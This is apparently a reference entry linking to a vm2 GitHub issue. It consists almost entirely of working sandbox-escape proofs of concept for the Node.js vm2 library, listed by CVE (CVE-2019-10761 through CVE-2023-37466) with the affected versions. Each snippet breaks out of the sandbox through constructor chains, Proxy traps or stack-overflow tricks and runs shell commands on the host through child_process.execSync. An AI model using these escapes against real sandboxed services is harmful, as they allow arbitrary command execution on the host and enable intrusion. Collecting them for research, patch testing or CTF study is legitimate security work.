---
title: "patriksimek/vm2#533"
description: "
Node.js vm2 escape

CVE-2019-10761

vm2 <= 3.6.10


CVE-2021-23449

vm2 <= 3.9.4

let res = import('./foo.js')
res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString();

CVE-2023-29199

vm2 <= 3.9.15

aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule
        .require('child_process')
        .execSync('echo \"flag is here\" > flag');
}

CVE-2023-30547

vm2 <= 3.9.16

err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}


CVE-2023-32314

vm2 <= 3.9.17

const err = new Error();
  err.name = {
    toString: new Proxy(() => \"\", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor(\"return process\")();
        throw process.mainModule.require(\"child_process\").execSync(\"whoami\").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }

CVE-2023-37466

vm2 <= 3.9.19

async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch 123'); }
            )
        }
    }
};
p.then();

vm2 is officially deprecated





"
external_category: "Miscellaneous"
---[Visit Website](https://github.com/patriksimek/vm2/issues/533)

